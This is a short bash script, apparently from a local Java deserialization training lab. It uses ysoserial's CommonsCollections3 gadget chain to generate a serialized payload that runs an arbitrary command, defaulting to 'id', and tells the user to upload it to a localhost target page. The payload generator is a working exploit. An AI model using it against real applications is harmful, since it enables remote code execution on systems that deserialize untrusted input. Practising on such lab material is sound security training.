#!/bin/bash
# class16 — CC3链 (CommonsCollections3)
# 靶场: /class16/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.base/sun.reflect.annotation=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections3 "$CMD" > ../../class16.ser 2>&1
echo "✅ 已生成: class16.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class16/"
